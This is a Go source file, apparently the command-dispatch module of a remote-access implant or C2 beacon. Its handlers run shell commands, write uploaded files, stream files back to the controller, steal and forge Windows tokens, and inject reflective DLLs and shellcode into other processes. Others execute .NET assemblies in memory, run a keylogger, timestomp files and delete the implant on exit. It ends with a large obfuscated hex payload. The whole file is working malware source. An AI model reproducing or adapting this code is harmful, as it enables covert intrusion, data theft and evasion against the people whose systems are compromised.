package services

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/shirou/gopsutil/process"
	"io"
	"io/ioutil"
	"main/communication"
	"main/config"
	"main/crypt"
	"main/packet"
	"main/sysinfo"
	"main/util"
	"math/big"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func ParseCommandShell(b []byte) (string, []byte, error) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		return "", nil, err
	}
	pathLen := communication.ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		return "", nil, err
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		return "", nil, err
	}

	cmdLen := communication.ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd, nil
}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := communication.ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
	shellPath, shellBuf, err := ParseCommandShell(cmdBuf)
	if err != nil {
		return nil, err
	}
	//var result []byte
	if shellPath == "" && runtime.GOOS == "windows" {
		go func() {
			_, err = packet.Run(shellBuf, Token)
			if err != nil {
				communication.ErrorProcess(err)
			}
			return
		}()
	} else {
		go func() {
			_, err = packet.Shell(shellPath, shellBuf, Token)
			if err != nil {
				communication.ErrorProcess(err)
			}
			return
		}()
	}
	return []byte("[+] command is executing"), nil
}

func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
	filePath, fileData := ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	result, err := Upload(filePathStr, fileData)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func CmdUploadLoop(cmdBuf []byte) ([]byte, error) {
	filePath, fileData := ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	result, err := Upload(filePathStr, fileData)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func Upload(filePath string, fileContent []byte) ([]byte, error) {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, errors.New("file create err: " + err.Error())
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		return nil, errors.New("file write err: " + err.Error())
	}
	return []byte("success, the offset is: " + strconv.Itoa(offset)), nil
}

func CmdDownload(cmdBuf []byte) ([]byte, error) {
	filePath := cmdBuf
	strFilePath := string(filePath)
	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
	go func() {
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
		fileLen := fileInfo.Size()
		test := int(fileLen)
		fileLenBytes := communication.WriteInt(test)
		requestID := crypt.RandomInt(10000, 99999)
		requestIDBytes := communication.WriteInt(requestID)
		result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
		communication.DataProcess(2, result)

		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
		var fileContent []byte
		fileBuf := make([]byte, 1024*1024)
		for {
			n, err := fileHandle.Read(fileBuf)
			if err != nil && err != io.EOF {
				break
			}
			if n == 0 {
				break
			}
			fileContent = fileBuf[:n]
			result = util.BytesCombine(requestIDBytes, fileContent)
			communication.DataProcess(8, result)
			time.Sleep(50 * time.Millisecond)
		}
		communication.DataProcess(9, requestIDBytes)
	}()

	return []byte("[+] Downloading " + strFilePath), nil
}

func CmdFileBrowse(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		return nil, err
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		return nil, err
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		return nil, err
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return nil, err
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		return nil, err
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}

	return util.BytesCombine(pendingRequest, []byte(resultStr)), nil

}

func CmdCd(cmdBuf []byte) ([]byte, error) {
	err := os.Chdir(string(cmdBuf))
	if err != nil {
		return nil, err
	}
	return []byte("changing directory success"), nil
}

func CmdSleep(cmdBuf []byte) ([]byte, error) {
	sleep := communication.ReadInt(cmdBuf[:4])
	if sleep != 'd' {
		config.WaitTime = time.Duration(sleep) * time.Millisecond
		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
	}
	return nil, nil
}

func CmdPwd() ([]byte, error) {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func CmdPause(cmdBuf []byte) ([]byte, error) {
	pauseTime := communication.ReadInt(cmdBuf)
	fmt.Println(fmt.Sprintf("Pause time: %d", pauseTime))
	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
}
func CmdSpawnX64(cmdBuf []byte) ([]byte, error) {
	cmdString := string(cmdBuf)
	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
	return packet.Spawn_X64([]byte(cmdString))
}

func CmdSpawnX86(cmdBuf []byte) ([]byte, error) {
	cmdString := string(cmdBuf)
	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
	return packet.Spawn_X86([]byte(cmdString))
}

func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
	return packet.Execute(cmdBuf, Token)
}

func CmdGetUid() ([]byte, error) {
	result, err := sysinfo.GetUsername()
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
	privCnt := int(communication.ReadShort(b[:2]))
	buf := bytes.NewBuffer(b[2:])
	privs := make([]string, privCnt)
	for i := 0; i < privCnt; i++ {
		tmp, err := util.ParseAnArg(buf)
		if err != nil {
			return nil, err
		}
		privs[i] = string(tmp)
	}
	return packet.GetPrivs(privs, token)
}

func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
	pid := communication.ReadInt(cmdBuf[:4])
	return packet.Steal_token(pid)
}

func CmdPs(cmdBuf []byte) ([]byte, error) {
	/*err := enableSeDebugPrivilege()
	if err != nil {
		fmt.Println("SeDebugPrivilege Wrong.")
	}*/
	buf := bytes.NewBuffer(cmdBuf)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	_, err := buf.Read(pendingRequest)
	if err != nil {
		return nil, err
	}

	processes, err := process.Processes()
	if err != nil {
		return nil, err
	}
	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
	for _, p := range processes {
		pid := p.Pid
		parent, _ := p.Parent()
		if parent == nil {
			continue
		}
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		var arc bool
		var archString string
		IsX64, err := sysinfo.IsPidX64(uint32(pid))
		if err != nil {
			return nil, err
		}
		if arc == IsX64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}

	//return append(b,[]byte(result)...)
	//return []byte(result), nil
	return util.BytesCombine(pendingRequest, []byte(result)), nil
}

func CmdKill(cmdBuf []byte) ([]byte, error) {
	pid := communication.ReadInt(cmdBuf[:4])
	return packet.KillProcess(pid)
}

func CmdMkdir(cmdBuf []byte) ([]byte, error) {
	if PathExists(string(cmdBuf)) {
		return nil, errors.New("Directory exists")
	}
	err := os.Mkdir(string(cmdBuf), os.ModePerm)
	if err != nil {
		return nil, errors.New("Mkdir failed")
	}
	return []byte("Mkdir success: " + string(cmdBuf)), nil
}

func PathExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

func CmdDrives(cmdBuf []byte) ([]byte, error) {
	return packet.Drives(cmdBuf)
}

func CmdRm(cmdBuf []byte) ([]byte, error) {
	Path := strings.ReplaceAll(string(cmdBuf), "\\", "/")
	err := os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(cmdBuf) + " success"), nil
}

func CmdCp(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	bytesRead, err := ioutil.ReadFile(src)
	if err != nil {
		return nil, err
	}
	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, err
	}
	defer fp.Close()
	_, err = fp.Write(bytesRead)
	if err != nil {
		return nil, err
	}

	return []byte("Copy " + src + " to " + dest + " success"), nil
}

func CmdMv(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	err = os.Rename(src, dest)
	if err != nil {
		return nil, err
	}

	return []byte("Move " + src + " to " + dest + " success"), nil
}

func CmdRun2self(Token uintptr) (uintptr, []byte, error) {
	flag, err := packet.Run2self()
	if err != nil {
		return Token, nil, err
	}
	if flag {
		return 0, nil, err
	} else {
		return Token, nil, err
	}
}

func CmdMakeToken(cmdBuf []byte) (uintptr, []byte, error) {
	Token, err := packet.Make_token(cmdBuf)
	if err != nil {
		return 0, nil, err
	}
	return Token, []byte("Make token success"), nil
}

func CmdHandlerJob(cmdBuf []byte) ([]byte, error) {
	return packet.HandlerJob(cmdBuf)
}

func CmdPortscanX64(cmdBuf []byte) ([]byte, error) {
	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
	return packet.Spawn_X64(cmdBuf)
}

func CmdPortscanX86(cmdBuf []byte) ([]byte, error) {
	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
	return packet.Spawn_X86(cmdBuf)
}

func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
	return packet.HandlerJob(cmdBuf)
}

func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
	if err != nil {
		return nil, errors.New("parameter wrong")
	}
	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf(data, dll)
	}
	//data is Csharp, dll is environment
	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
	dataBuf := bytes.NewBuffer(data)
	data, _ = util.ParseAnArg(dataBuf)
	dataParam := dataBuf.Bytes()
	param := string(dataParam)

	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.Trim(param, " ")
	params := strings.Split(param, " ")
	return packet.ExecuteAssembly(data, params)
}

func CmdExecuteAssemblyX86(cmdBuf []byte) ([]byte, error) {
	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
	if err != nil {
		return nil, errors.New("parameter wrong")
	}
	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf(data, dll)
	}
	//data is Csharp, dll is environment
	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
	dataBuf := bytes.NewBuffer(data)
	data, _ = util.ParseAnArg(dataBuf)
	dataParam := dataBuf.Bytes()
	param := string(dataParam)

	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.Trim(param, " ")
	params := strings.Split(param, " ")
	return packet.ExecuteAssembly(data, params)
}

func ParseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)

	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	offset := make([]byte, 4)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	_, _ = buf.Read(offset)
	callBackType := communication.ReadShort(callbackTypeByte)
	sleepTime := communication.ReadShort(sleepTimeByte)
	offSet := communication.ReadInt(offset)
	description, err := util.ParseAnArg(buf)
	csharp, err := util.ParseAnArg(buf)
	dll := buf.Bytes()
	return callBackType, sleepTime, offSet, description, csharp, dll, err
}

func CmdImportPowershell(cmdBuf []byte) ([]byte, error) {
	return packet.PowershellImport(cmdBuf)
}

func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
	return packet.PowershellPort(cmdBuf, powershellImport)
}

func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
	rx64, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
	hx64, _ := hex.DecodeString("4d5a41525548")
	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], hx64) {
		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectProcess([]byte("\x00"), cmdBuf)
	}
	return packet.InjectProcessRemote(cmdBuf)
}

func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
	rx86, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
	hx86, _ := hex.DecodeString("4d5a5245")
	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], hx86) {
		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectProcess([]byte("\x00"), cmdBuf)
	}
	return packet.InjectProcessRemote(cmdBuf)
}

func CmdExit() ([]byte, error) {
	if config.DeleteSelf {
		_, err := packet.DeleteSelf()
		if err != nil {
			return nil, err
		}
		os.Exit(0)
	}
	os.Exit(0)
	return []byte("success exit"), nil
}

func CMDBof(cmdBuf []byte) ([]byte, error) {
	if bytes.Contains(cmdBuf, []byte("SetFileTime")) {
		buff := bytes.NewBuffer(cmdBuf[8:])
		_, err := util.ParseAnArg(buff)
		if err != nil {
			return nil, err
		}
		temp := make([]byte, 4)
		_, err = buff.Read(temp)
		if err != nil {
			return nil, err
		}
		for i := 0; i < 4; i++ {
			_, err = util.ParseAnArg(buff)
			if err != nil {
				return nil, err
			}
		}
		params, err := util.ParseAnArg(buff)
		if err != nil {
			return nil, err
		}
		buffParams := bytes.NewBuffer(params)
		to, err := util.ParseAnArg(buffParams)
		if err != nil {
			return nil, err
		}
		from, err := util.ParseAnArg(buffParams)
		if err != nil {
			return nil, err
		}
		return packet.TimeStomp(bytes.Trim(from, "\x00"), bytes.Trim(to, "\x00"))
	} else if bytes.Contains(cmdBuf, []byte("GetSidSubAuthorityCount")) && bytes.Contains(cmdBuf, []byte("GetSidSubAuthority")) && len(cmdBuf) > 250000 {
		hexEncoded := "263fe96b66796b657d6b6579949a796bdd796b65796b65792b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b6579eb65796b6b66d16b79df6cb44add7827a8583f0d10184509190a1e1904144b0618050b161f451b0e450b1e0b59020b592f2a2a4b08160f00576668734f65796b65796b65292e65790fe37b6b349aa9f2796b65796b65796b95794965726955796b41796b657f6b65796b65796b65796b65596b65796b65396a65796b65596b65796965796f65796b65796b657d6b65796b65796b65f96b65796965796b65796b66792be0796b25796b65796b65396b65796b65796b65696b65796b65794b65796b65796b65796b65696b65796b65796b65796b65796b65796b65796b65196b65a56f65796b65796b65796b65796b65796b65796b65796b65796b6579b326796b79796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65596b65316b65796b65796b65796b65571f00011f65796b915a6b65794b65796b41796b657b6b65796b65796b65796b65796b65596b651945170a1906796b65a56f65796b05796b657f6b65794d65796b65796b65796b65796b65792b65792b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65316b657969657c6b0d5f6b65097665796a65796b70796b63796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b65796b656a5b67794f65796b64796b747969b5786b6562436d796b6f5162657961c0786b65626167516565796d657f604e796c4f3b6b67516165796165076065796175794165796b76496865656b65796965797a657b4369796b6f51666579616f7b6d735165657961657f604e796c4f6a5b60799e65796b66796b747979657c4372796b637fe761796b67516465796d6e076065796169662b687b68b57d6b657b436d796b6f51646579616c6b694d726b657f7d9b78786d686349706b736a625dd06b6579156e796b6f6a6f677a6cb57d6b657b436d796b6f5164657961777d4369796b636f95646a6174734763797d7670401f6b6e9b6c6f657969747ce761796b67516465796d767f156e796b6f6a6c677a7a63a96f6579694d716b6573436a796b6f6b6c4d7c6b657f7d9b78786e6860497f6b736a624e4d7a63516a657940767c6c4d776b657f6b777c95737d6b657b0475796b6f7c4374796b6f6a6774754763797d767040606e786c526b74704165796b76496e65896965796f65797a6551796579610a6a6b65736145416f65797d63516f65796d6e6b699b6c6d6579696df56d6579694d766b657f66736a6f626f626df56d6579694d756b65737961516a65796d767c7a606f95666a78746a476c797d766d53f77b6b65704367796b4e751964796b15711069796b61f57d65796a4d6d6b65736b1b726b657378636b6c9b6c63657969747ee76d796b67516465796d76716c6d026265796f74717a62f5636579694d756b65737963516e65796d73876a766c7a705562656f7871414167796b74714366796b4e6a6c77709570706b657b7a6cf5626579694d766b657f786f7e7a62024965796f74737a6cf5626579694d756b65737963516e65796d73876a766f7a735562656f787141b764796b74734361796b4e6a62747e1043796b61516965796d6507606579617672156e796b6f6a6777727962054865796f4d6c6b6573740513334d6f6b657379696b6c195a6b657d4370796b6f661b0f214373796b6f7e7a6e0b4465791b67517b65796d73876a766e7a725562656f7871410164796b62686717326b6509694d696b657f7d9b78787d687349706b736a7f5d336a65794b9a796b650a7c6579617674156e796b6f68667474047d796b6f516165796d4368660a696b6573786b6d786a686c1e5b6b657dbb6c796b6751636579614d706b6573ce6c796b676a7b7469104f796b61026d65796f76687a6c024165796f1e7f6b657d7877797a77a9616579694d716b6573436c796b6fdc616579697660156e796b6f6a711b726b6573787e6b71776b4370796b6f66230f214373796b6f6b70776b4370796b6f66330f214373796b6f6b72194d6b657d95737d6b657b0475796b6f6a6474777a6a517265796176657a795556657e7a7f0b0865791b67517b65796d73876a76647a78556d656f7871523262687017026b6509694d696b657f7d9b78787b6875497f6b736a7f4e45404468721e576b657d1063796b616a796568797468437f796b6f6a747466515186949a686c1e5f6b657d4366796b63796c4d7f6b657f4d726a7f4e797a71534967517065796165536b657978557a6b3f796b657c6b65686b6a7919f6796b1551776579616f0bfc65791b6351766579616e6b699b6c66657969777b63e9746b657b4369796b6f042265796f777b156e796b6f043a65796f777b7118376b657d6c777b684d6a6b657f666c6a6f4e797a61536b656a5b6379cc65796b63796b747969eb107c9b7d7861686f49686b17a86b6509437b796b6f7953ed796b65598366796b4d666b65736b77791990796b15514b6579617778195a786b15514b65796117f06a65094374796b636f95646a6e747c476c797d4d586b65736b657f6c4d6d6b657f1f6a796b67756b67f7027220e671796b64746972707d67f70272204347796b6f7963676ff117c06a6509624d5a6b65737f73137d0f164a65796d43714341796b6f5f41477b437e796b6f7941d7796966164e6579617d23ba187a6b657d6967026865796f7d21ba187d6b657d6966514d657961187c6b657d410379691e7c6b657d436f796b6f79691b726b65731660796b61536b76496a65686b65796c65797a657b1060796b61514c6579616f526b63536b657978557b6b68796b65716b65686b7951436579613f7340657f4165796b272a2127786b64796b65796b69796b650f594b494550495c574e6b65796b60790765796b1d726b655a1565798f6e796bb1756b655a38110b020b1e1865796b65c1736579ab64796b462c3865017165797b65796b463e3e2c3d6b6579e37f796b8d7b6b655a2909160965796b65796b657b6b65783cdada766c776b657991644a6b73796b64796b65636b65796465796b05796b65576b65795265796b64796b65516b65794a65796b6d796b657e6b65796a65796b6e796b65716b65796a65796b64796b65786b65796f65796b64796b65746b65796a65796b67796b65756b65796a65796b61796b65796b507f6a65796b65796d658e6e23706d656e6d23706d65c46e717064651f6265796d652760d67e6d65a0639e726d65296ed67e6d65b168d67e6d65916ed67e6d65c36cd67e6d65f168d67e6d65e56ed67e6d65d66e42706d65466e42706d65a86e42706d652c6ed67e6d658168d67e6d651e6c42706d657462d67e6d65e36dd67e6165c16171706d657562d67e6d65d66fd67e6d652568177f6d65ef60d67e6d653f67d67e6b65796bd2796b65796b64796a65796b7579a66dde6370796a65786b64797b65c163dd717e65786b76796164696b01786b65646b66797c65736a7579d367796b78796d65636b6f787b65c66a65797665716b7f796164696b597b6b65646b6b7970656b6a75799865796b78797765626b6f787b659c6b657976655e6b7e796164696bc77b6b65646b4b7970657b6a6579c86c796b4c795d65626b60786b651069657942653d6b7e796664696b5b796b65646b2c7970657c6a6579e667796b4c793965626bc6696b65166c65796b65186b7e793ae52169a3783ae52d6aa3786d658f6dac786d65b06dac786a6589635d796d654c6c5d796d65566c5d796d656f605d796d65b9615d796d65386c5d796d65bf675d796d656d68a9786d657e685d796d65b06daa786d658f6daa786d65c962aa786d65f262aa786d6593685d796d650c62aa786d65146f5d796d65056f5d796d65416f5d796d65d06db7786d65f56f5d796d65d86db7786d65a86fb7786d656c6eb7786d65ee68b3786d658362b3786d651a68b3786d65236eb3786d65f6605d796d65b6615d796d65ac635d796d6552615d796d65b5695d796d65ec635d796d655a6c5d796d658f6daa786d650868b3786d653e6f5d796d65d460bc786d659a60bc786d65ba60bc786d657f605d796d65c262bc786d659e62bc786d65b562bc786d65166e5d796d65db605d796d65cc68aa786d65926fb7786d65a66fb7786d63bd69aa783de5036cb8783de5066eb8783de52f68b8783de55263b8783de53d68b8783de5f06eb8783de56f6fb8783de50861b8783de5a369b8783de57263b8783de56363b8783de5996cb8783de5266db8786d63bd6984783de5256a81783de5ef6a81783de5f06a81783de5ed6981786865f860aa786865fb62aa786865d468aa786865526eaa786865ef62aa7868656c67aa786865b868aa786a65fd638d786865eb685d796d63bd698e783de5896a8b783de5a36a8b783de563698b783de57c698b783de5496a8b783de5e26a8b783de56d6a8b783de50a6a8b783de5ab6b8b783de5b96b8b783de508698b783de57f6a8b783de557698b783de5cd6a8b786b65796be579fd45ed6197786a65796b6579eb65ef4b097158657f6b65796b65f96bf359296d4a6b62796b65796be579fd45f16199786365796b6579eb65e84b39756f67726b65796b65f96bf4596161776975796b65796be579fa45f867767b7965796b6579eb65e84b627571676d6b65796b65f96bf4594f69596973796b65796be579fd45c66f437b7365796b6579eb65ef4b50754567626b65796b65f96bf3590569416945792345796b6579fa65196e277b4e65014b65796b65e86bba7a58655f6be9596b65796bf479966d30694279df45796b6579fd65fa6d2b7b4365c14a65796b65ef6b9d793d67556bd15d6b65796be3619c6d7f6b48796b65796b6579f84520603e7b4665b94f65796b65ef6b4d720e67486b4d5c6b65796bf479bd6214695679b040796b6579ed7d8e6363795f659d4e65796b65ff7392717b654d6b745f6b65796b83781c607f6b50794743796b6579ad65e16d0b795e65354d65796b65ff63267fcd654c6b65796b65fa7ba37c77657f6b50796b65796be669ad60546b63795e65796b6579e875bf6e2c796d654c6b65796b65fa7ba37c09657f6b50796b65796be669ad600a6b63795e65796b6579e875bf6ee1796d654c6b65796b65fa7ba37c9d670a6950796b65796be669ad60e76b63795165796b6579e875bf6eca796d65436b65796b65fa7ba37c6a657f6b5f796b65796be669ad606a6b63795165796b6579e875bf6e41796d65436b65796b65fa7ba37c5e657f6b5f796b65796be669ad60286b63795165796b6579e875bf6e0f796d65436b65796b65fa7ba37c10657f6b5f796b65796be669ad60f56b63795165796b6579e875bf6ef0796d65436b65796b65fa7ba37ccd657f6b5f796b65796be669ad60736b63795165796b64793b61796b6779566f796b66799362796b6179bc63796b60799b63796b6479316d796b6479316d796b64790a6f796b67793561796b66794f66796b6479146f796b67798b6f796b66798c6d796b617933637b6b60795b66794b65796b65796b64792b6e796b64798c6d796b67793963796b6479e666796b67797469796b64793e6f796b67799c61786b6479dc617b6b67796160784b66792763796b6479146f796b6779856f796b66793363796b61791f6e796b60790e6e796b6479146f796b67798b6f796b66798c6d796b61792763796b6079d462796b6479c861796b6479c861796b64797462796b6479bf66796b6779936f796b6679c162796b61793a69796b64793a69794b65796b65796b64796960786b6779786f784b66791666796b6479e966796b67792364796b6479dd6c796b6479746e784b6479c161784b67794b6f784b6679fe69786b61795062786b607944697d6b447962658e6364797a658e63637972658e636f7922658e6363790a658e63637902658e63757912658e637079ea655f6f4079fa65196e4979fa65226c5679f265e9635d79fa65126d2579fa65376c2079fa6584632f79fa65126d06794265e16d0b79ca65c1671779c265d761c479c2657968c379d265586eca79f265236bda79f2658e63a6795a658e6364795a65e667c379ca65d5671779f265c167ad7942658e6363793265e16db279ca655860b979d265586e8a79aa65d863917932658e637579a265f3609179ba6535679c79ca65a26c6178fa6531602579ca65c76dc379fa65756c6e78fa65846d7178f2653a6d787860657d6b4f786065716b4f786265a56b56786265996b5d7862659d6b58786265916b27786265956b22786265896b297862658d6b34786265816b33786265856b3e786265796a057862657d6a00786265716a0f786265756a0a7861656d6a11786165616a4f786165656a18786165596ae3786365356a5d786365296a587863652d6aea786365216a22786365256a00786365196a0f7863651d6af1786365116afc786365156afb786365096ac67863650d6acd786365016ac8786365056ad7786365f96ad2784565726be47b45656a6bef7b4565626bcc7b08645a6b5d78a8645a6b5d7888644a6bd77b8864426bb97bcb67526b5d784a65c56a5079d564226ba5780a65bb6a0e79af64146ba1780465bd6a65792b65796b6d796b65796b79796a65796b78796965796b7b796865796b7a796365796b45797b65796b44797365796b47794b65796b46794365796b41795b65796b40795365796b43797065426b34791365b76b87797b64606a63796a65796b3f7f16677b6b7f796865d96ced7efe62076c47796b647a6bf1736a65796a6079076d786b65786c653b6364792b64706bed736965396a6e7937697b6b25786665736f67792d64766be4756965396a74796c697a6b657878655d6766792b646c6bda7d6965796a72795e697b6b65787265176767796e645e6b3c726f657deb65796b65796b65796b65796b65796b65956965796965796b65796b65796b65794a649a6965796b657b6b65796b65796b65796b65586ad67e6b65796b617969657c6b67796d657b6b62796965716b677962657b6b6f796965726b677967657a6b68796865776b667964657a6b65796b65626bee7b7165106b7f79c165636bd0797165c36b65796b281c1f0d160f54496b281c1f0d160f57496b281c1f0d160f54486b281c1f0d160f547926000d030a1d5a577926000d030a1d5965340e111104014858653b222b3d342a293f364a6b281c1f0d160f567926000d030a1d5a51793f0a3005114f5f65340e111104014d6b281c1f0d160f544c6b281c1f0d160f507926000d030a1d5a537926000d030a1d5d65340e11110401485c65340e11110401485365340e11110401416b281c1f0d160f54406b281c1f0d160f5c795728160f10150e5b7928292a2831213420372a27352e3a382a247928292a28312134213038243b2720262a24386b3a292e272627212b3421383f247934353c2965340a16081e000b0a011c3b203b6b263538262d333a3025352b24267928292a2831213420372a27352e3a3a24213c3421363c2b3524243d6b263538262d333a37243a3a24213c3421363c2b3524243d6b2c171f000b0d041a0e2c3d6b362e342d302f2079383a3f2a292a2e652c252c3a24213c34362d392c372c653a27363a3f3d26252a262d243027302b2e3a352422792e3a30253338272c3d2a373e6b3626242e7928292a283121342b3634262c383136263a342a372a2324356b263538262d333a3827297934352b24263c38362629242a22